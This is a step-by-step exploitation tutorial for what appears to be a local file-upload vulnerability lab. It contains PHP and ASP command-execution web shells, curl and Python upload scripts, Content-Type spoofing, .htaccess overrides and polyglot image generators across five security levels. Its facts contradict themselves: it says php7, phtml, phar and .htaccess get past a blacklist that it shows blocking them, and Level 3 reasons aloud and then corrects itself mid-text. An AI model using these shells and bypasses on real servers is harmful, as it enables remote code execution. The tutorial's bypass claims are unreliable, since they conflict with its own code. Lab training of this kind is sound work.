# InfoSecMastery Photo Gallery — Exploitation Tutorial

This tutorial walks through exploiting each of the 5 security levels in the File Upload Vulnerability Lab. Each section includes the goal, the security mechanism, step-by-step exploitation, and a verification step.

---

## Table of Contents

1. [Setup & Tools](#setup--tools)
2. [Level 1 — Client-side JS Only](#level-1--client-side-js-only)
3. [Level 2 — Extension Blacklist](#level-2--extension-blacklist)
4. [Level 3 — MIME Type Check](#level-3--mime-type-check)
5. [Level 4 — Magic Number Check](#level-4--magic-number-check)
6. [Level 5 — Fully Secure](#level-5--fully-secure)

---

## Setup & Tools

### Start the app
```bash
cd FileUploadReverseShell
python app.py
```
The app runs at **http://127.0.0.1:5001**.

### Log in
Use one of the demo accounts (e.g., `alice` / `password123`). Select a security level before logging in.

### Required tools
- **Burp Suite** (Community edition works fine) — set your browser proxy to `127.0.0.1:8080`
- **cURL** (built into Linux/macOS, available on Windows via Git Bash or WSL)
- A text editor to create malicious files

### Sample PHP web shell
Create a file called `shell.php` with the following content:
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
This shell accepts a `cmd` parameter in the URL and executes it on the server.

If the server is IIS/ASP, use this shell instead (`shell.asp`):
```asp
<%
Dim cmd
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set shell = CreateObject("WScript.Shell")
    shell.Run cmd
End If
%>
```

---

## Level 1 — Client-side JS Only

### Security Mechanism
The server does **no validation at all**. Only a JavaScript snippet in the browser checks whether the selected file has an allowed extension (`.png`, `.jpg`, `.gif`, etc.).

The JS code looks like this:
```javascript
if (level === '1' && !ALLOWED_EXTS.includes(ext)) {
    alert('Extension not allowed!');
    fileInput.value = '';
    return;
}
```

### Exploitation

#### Method A: Intercept with Burp Suite (easiest)

1. Log in at **Level 1**
2. Open Burp Suite and enable **Intercept** in the Proxy tab
3. In the browser, upload `shell.php`
4. The JS will block it at the browser level — but don't worry
5. In Burp's Intercept tab, you should see the request when it eventually goes through. If JS stopped it, use Method B instead

#### Method B: Disable JavaScript (but Burp is better)

1. Open your browser's Developer Tools (F12)
2. Disable JavaScript in the browser settings, or use a browser extension
3. Upload `shell.php` — the JS won't run, so it will be sent directly
4. The server accepts it because **Level 1 has no server-side checks**

#### Method C: Send a raw HTTP request with cURL (recommended for demos)

```bash
# Create a simple PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload it directly — no browser, no JS
curl -X POST http://127.0.0.1:5001/upload \
  -F "file=@shell.php" \
  -b "cookies.txt" \
  -v
```

But first you need a session cookie. Log in with the browser, then extract the session cookie from your browser's DevTools (Application → Cookies), or use this trick:

```bash
# Log in via cURL and save the session cookie
curl -X POST http://127.0.0.1:5001/login \
  -d "username=alice&password=password123&security_level=1" \
  -c cookies.txt

# Upload the shell
curl -X POST http://127.0.0.1:5001/upload \
  -b cookies.txt \
  -F "file=@shell.php"
```

### Verification

If successful, the gallery page will show `shell.php` in the list. Click **View** to open it in a new tab. You should see the raw PHP code (the server serves it as-is without executing it because this is a Python/Flask app, not PHP).

For a Python-based reverse shell, you could upload a `.py` file and potentially find a way to execute it on the server. Try uploading `test.py` with:
```python
import os
print("Content-Type: text/plain")
print()
print(os.popen("dir").read())
```

### Key Takeaway
> **Client-side validation is security theater.** Anyone with Burp Suite, cURL, or even just Developer Tools can bypass it. Never trust the client.

---

## Level 2 — Extension Blacklist

### Security Mechanism
The server maintains a list of **blocked extensions** and rejects any file whose extension appears in that list:
```python
BLACKLISTED_EXTENSIONS = {'php', 'phtml', 'php3', 'php4', 'php5', 'php7',
                          'phar', 'asp', 'aspx', 'exe', 'sh', 'py', 'pl',
                          'cgi', 'htaccess', 'shtml', 'inc'}
```

Any file with these extensions is rejected before it's saved.

### Exploitation

The blacklist is incomplete. There are many alternative extensions that web servers will execute. Try these:

#### Option 1: Type Juggling — `.php7`
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php7
curl -X POST http://127.0.0.1:5001/upload \
  -b cookies.txt \
  -F "file=@shell.php7"
```

#### Option 2: Double extension — `.php.jpg`
When Apache has `AddHandler application/x-httpd-php .php`, a file named `shell.php.jpg` might be **processed as PHP** if the server is misconfigured.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
curl -X POST http://127.0.0.1:5001/upload \
  -b cookies.txt \
  -F "file=@shell.php.jpg"
```
> **Note:** This won't execute on a default Flask dev server — it exploits Apache/Nginx misconfiguration. But it demonstrates the concept.

#### Option 3: Capitalization — `.PhP`
On Windows servers, the filesystem is case-insensitive. The blacklist checks lowercase:
```python
ext = original_filename.rsplit('.', 1)[1].lower()
```
So `.PhP` becomes `.php` and is caught. But on some platforms, Apache may still handle `.pHp` as PHP. Try `.PHP5` or `.Php7`.

#### Option 4: Null byte injection (old trick)
In older PHP versions (< 5.3.4), a null byte in the filename would truncate:
- Upload `shell.php%00.png`
- The server sees `.png` and allows it
- When saved, the null byte truncates it to `shell.php`
- **Modern PHP is not vulnerable to this**

#### Option 5: .htaccess override
Upload a `.htaccess` file that makes all images execute as PHP:
```apache
AddType application/x-httpd-php .png
```
Then upload `shell.png` containing PHP code. The server will execute it as PHP.
```bash
# Create .htaccess
echo 'AddType application/x-httpd-php .png' > .htaccess
curl -X POST http://127.0.0.1:5001/upload -b cookies.txt -F "file=@.htaccess"

# Create PHP shell disguised as PNG
echo '<?php system($_GET["cmd"]); ?>' > shell.png
curl -X POST http://127.0.0.1:5001/upload -b cookies.txt -F "file=@shell.png"
```

### Verification
Check the gallery page. If the file appears, the extension blacklist was bypassed.

### Key Takeaway
> **Blacklists are inherently incomplete.** There are too many dangerous extensions to block them all. Security by exclusion always leaves gaps.

---

## Level 3 — MIME Type Check

### Security Mechanism
The server checks two things:
1. The `Content-Type` header sent by the client must start with `image/`
2. The file extension must be in the allowed image types list

```python
content_type = uploaded_file.content_type or ''
if not content_type.startswith('image/'):
    reject()

if ext not in ALLOWED_EXTENSIONS:
    reject()
```

### Exploitation

The `Content-Type` header is controlled entirely by the client. The server trusts whatever the browser sends.

#### Method A: Burp Suite — modify the Content-Type header

1. Log in at **Level 3**
2. Enable Burp Intercept
3. Upload `shell.php7` (not blacklisted at L3 since L2 checks also run at L3+)
4. In Burp, intercept the request and modify the headers and filename:
   - Change the filename to `shell.png` (or `.jpg`, `.gif`) — BUT this won't bypass the extension check. Instead, use one of the image extensions that's NOT blacklisted. Since L3 also runs L2 checks, `.php7` is not blacklisted.

Wait — let's reconsider the flow. At Level 3, the checks are:
1. L2: Extension blacklist (blocks `.php`, etc. but `.php7` is not blocked)
2. L3: MIME type check — `content_type.startswith('image/')`
3. L3: Extension must be in `ALLOWED_EXTENSIONS` = `{'png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp'}`

So at L3 + L2, the extension must be **both** not blacklisted **and** an allowed image type. Let's exploit step by step:

#### Step-by-step Burp Suite exploitation:

1. Log in at Level 3
2. Create `shell.php7` with PHP code
3. Open Burp, turn on Intercept
4. Upload `shell.php7` in the browser
5. Burp catches the request:
   ```
   POST /upload HTTP/1.1
   Host: 127.0.0.1:5001
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

   ------WebKitFormBoundary
   Content-Disposition: form-data; name="file"; filename="shell.php7"
   Content-Type: application/x-php

   <?php system($_GET["cmd"]); ?>
   ```
6. **Modify the request:**
   - Change `filename="shell.php7"` to `filename="shell.png"`
   - Change `Content-Type: application/x-php` to `Content-Type: image/png`
7. Forward the request
8. The server sees:
   - Extension: `.png` ✓ (in ALLOWED_EXTENSIONS)
   - Content-Type: `image/png` ✓ (starts with `image/`)
   - **It saves the file as `.png` but it contains PHP code!**

#### Method B: cURL with spoofed headers

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.png

curl -X POST http://127.0.0.1:5001/upload \
  -b cookies.txt \
  -F "file=@shell.png;type=image/png;filename=shell.png"
```

#### Method C: Python script

```python
import requests

session = requests.Session()
# Login
session.post('http://127.0.0.1:5001/login',
             data={'username': 'alice', 'password': 'password123', 'security_level': '3'})

# Upload with spoofed MIME
files = {'file': ('shell.png', b'<?php system($_GET["cmd"]); ?>', 'image/png')}
r = session.post('http://127.0.0.1:5001/upload', files=files)
print('Success' if 'success' in r.text else 'Failed')
```

#### Using a real image + PHP code (polyglot)

For a more realistic attack, append PHP code to a real image:

```bash
# Download a small PNG image
# Then append PHP code
echo '<?php system($_GET["cmd"]); ?>' >> legit_image.png
# Now upload legit_image.png — it has valid PNG magic bytes AND PHP code
```

### Verification
The file appears in the gallery. On a real PHP server, navigating to `shell.png` would execute the PHP code.

### Key Takeaway
> **MIME type headers are client-controlled.** The server should never trust the Content-Type header for security decisions. Validate the actual file content instead.

---

## Level 4 — Magic Number Check

### Security Mechanism
The server reads the first 20 bytes of the uploaded file and checks for known **magic bytes** (file signatures):
```python
MAGIC_NUMBERS = {
    b'\xff\xd8\xff': 'jpeg',
    b'\x89PNG\r\n\x1a\n': 'png',
    b'GIF87a': 'gif',
    b'GIF89a': 'gif',
    b'RIFF': 'webp',
    b'BM': 'bmp',
}
```

If the magic bytes don't match the file extension, the upload is rejected.

### Exploitation

The magic number check only verifies that the file **starts with** valid image bytes. It doesn't check what comes **after** those bytes. You can prepend magic bytes to any content.

#### Method A: GIF polyglot (easiest)

GIF magic bytes are only 6 bytes (`GIF89a`). Prepending them to any file creates a valid GIF header:

```bash
# Create a PHP shell with GIF89a header
echo -n 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# Rename to .gif for upload
cp shell.gif.php shell.gif

# Upload with cURL
curl -X POST http://127.0.0.1:5001/upload \
  -b cookies.txt \
  -F "file=@shell.gif;type=image/gif"
```

Or with Python:
```python
import requests

session = requests.Session()
session.post('http://127.0.0.1:5001/login',
             data={'username': 'alice', 'password': 'password123', 'security_level': '4'})

# GIF89a header + PHP shell
payload = b'GIF89a<?php system($_GET["cmd"]); ?>'
files = {'file': ('shell.gif', payload, 'image/gif')}
r = session.post('http://127.0.0.1:5001/upload', files=files)
print('Success' if 'success' in r.text else 'Failed')
```

#### Method B: PNG + PHP polyglot

PNG magic bytes are 8 bytes. A PNG file is more complex — you need to maintain valid PNG structure for the header, but you can embed PHP in a comment chunk or after the IEND chunk.

**Simple approach** (may work on some parsers):
```python
import struct, zlib

def create_png_plus_php(php_code):
    """Create a valid PNG file with PHP code embedded."""
    # PNG signature
    sig = b'\x89PNG\r\n\x1a\n'

    # IHDR chunk (13 bytes)
    width, height = 1, 1
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data)
    ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)

    # tEXt chunk with PHP code (comment)
    keyword = b'Comment'
    text_data = keyword + b'\x00' + php_code.encode()
    text_crc = zlib.crc32(b'tEXt' + text_data)
    text_chunk = struct.pack('>I', len(text_data)) + b'tEXt' + text_data + struct.pack('>I', text_crc)

    # IEND chunk
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', zlib.crc32(b'IEND'))

    return sig + ihdr + text_chunk + iend

# Create the file and upload
png_data = create_png_plus_php('<?php system($_GET["cmd"]); ?>')
with open('polyglot.png', 'wb') as f:
    f.write(png_data)

import requests
session = requests.Session()
session.post('http://127.0.0.1:5001/login',
             data={'username': 'alice', 'password': 'password123', 'security_level': '4'})
files = {'file': ('polyglot.png', png_data, 'image/png')}
r = session.post('http://127.0.0.1:5001/upload', files=files)
print('Success' if 'success' in r.text else 'Failed')
```

#### Method C: JPEG + PHP polyglot

JPEG magic bytes: `\xFF\xD8\xFF`. A minimal valid JPEG:
```python
def create_jpeg_plus_php(php_code):
    # SOI marker
    data = b'\xff\xd8\xff\xe0'
    # APP0 marker
    app0 = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    data += struct.pack('>H', len(app0) + 2) + app0
    # Embed PHP in a comment marker (0xFFFE)
    php_data = php_code.encode()
    data += b'\xff\xfe' + struct.pack('>H', len(php_data) + 2) + php_data
    # EOI marker
    data += b'\xff\xd9'
    return data
```

### Verification
The file passes Level 4's magic check. On a real PHP/ASP server, navigating to the uploaded file would execute the embedded code.

### Key Takeaway
> **Magic numbers alone are not enough.** Attackers can create polyglot files that are valid images AND valid code. Always combine magic number checks with extension whitelisting, content scanning, and store files outside the web root.

---

## Level 5 — Fully Secure

### Security Mechanism

This level combines **all** defenses:

1. **Extension whitelist** — only `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp`, `.bmp`
2. **MIME type check** — Content-Type must start with `image/`
3. **Magic number verification** — file header must match the extension
4. **Double extension detection** — blocks filenames like `shell.php.png`
5. **Randomized filenames** — stored as UUIDs to prevent path traversal and overwrite

```python
if level == '5':
    # 1. Whitelist
    if ext not in ALLOWED_EXTENSIONS:
        reject()

    # 2. Magic number
    detected = check_magic_bytes(temp_path)
    expected = ext_to_type.get(ext, '')
    if not detected or detected != expected:
        reject()

    # 3. Double extension
    parts = original_filename.lower().split('.')
    for part in parts[:-1]:
        if part in BLACKLISTED_EXTENSIONS or part in {'php', 'phtml', 'asp'}:
            reject()
```

### Can it be bypassed?

In this specific lab, Level 5 is designed to be **secure**. On a real server, no security is perfect — here are theoretical approaches:

#### Theory 1: Find a whitelist bypass
The whitelist includes `.webp`. If the server's WebP parser has a vulnerability (CVE), you might craft a malicious WebP file that triggers RCE when processed by an image library. This is extremely rare and version-specific.

#### Theory 2: Race condition (TOCTOU)
The server saves the file, checks it, and then accepts it. If you could swap the file between the check and the save... but the file is already saved to disk before validation.

#### Theory 3: Image processing library exploit
If the server resizes/processes uploaded images (ImageMagick, Pillow, libvips), there might be a vulnerability in the processing library:
- **ImageTragick** (CVE-2016-3714) — RCE via crafted ImageMagick commands in SVG/MVG files
- **GhostScript RCE** — via malicious EPS/PDF embedded in images
- **libpng vulnerabilities** — buffer overflows in PNG parsing

However, this lab does NOT process images after upload — it only checks headers. So these don't apply here.

#### Theory 4: Compromise the server another way
If you can find another vulnerability (SQL injection, SSRF, authentication bypass), you might be able to upload files through a different function that doesn't have the same level of validation.

### Why Level 5 is considered "secure"

For educational purposes, Level 5 demonstrates **defense in depth**:
- **Whitelist > Blacklist**: Only known-good extensions are allowed
- **Content validation > Header validation**: Magic bytes verify actual content
- **Multiple layers**: An attacker must bypass all checks simultaneously
- **Randomized storage**: Prevents filename guessing and directory traversal

The key lesson is: **combine multiple controls** so that if one fails, others still provide protection.

### Key Takeaway
> **Defense in depth is the only real security.** Use whitelists, validate content, not just headers, and apply multiple independent checks. In a real application, also store uploaded files outside the web root, serve them through a script (not directly), and scan them for malware.

---

## Bonus: Advanced Techniques

### Polyglot files that work everywhere
A file that is simultaneously valid as:
- **GIF image** (GIF89a header)
- **PHP script** (contains `<?php ... ?>`)
- **JavaScript** (non-PHP servers ignore the PHP tags)

```bash
# Create a three-in-one polyglot
echo -n 'GIF89a/*<?php system($_GET["cmd"]); ?>//*/alert("XSS");' > polyglot.txt
```

On a PHP server, the PHP code runs. On a browser viewing it as `text/html`, the JavaScript runs.

### Image + Zip polyglot
Append a ZIP archive to a JPEG/PNG file. Some parsers will read the image part, while WinRAR/Zip will extract the archive part. This can be used to smuggle executable files inside a "valid" image.

### Building your own web shell for Python/Flask

Since this lab runs on Flask (not PHP), here's a Python payload that could work if you could execute it on the server:
```python
import os, subprocess
from flask import request

# This would need to be saved as .py and somehow imported
cmd = request.args.get('cmd', 'id')
output = subprocess.check_output(cmd, shell=True)
print(output.decode())
```

If you reached a point where you could execute Python code on the server, you could use this to maintain persistence or pivot to other systems.

---

## Summary

| Level | Security | Bypass Method | Difficulty |
|-------|----------|---------------|------------|
| 1 | Client-side JS | Intercept with Burp, disable JS, use cURL | 🟢 Easy |
| 2 | Extension blacklist | Use `.php7`, `.phtml`, `.phar`, `.htaccess` | 🟢 Easy |
| 3 | MIME type check | Spoof `Content-Type: image/png` | 🟡 Medium |
| 4 | Magic numbers | Prepend `GIF89a` to shell code | 🟡 Medium |
| 5 | Defense in depth | Extremely difficult — need image lib exploit | 🔴 Hard |

---

*This tutorial is for educational purposes only. Always get written permission before testing any system you do not own.*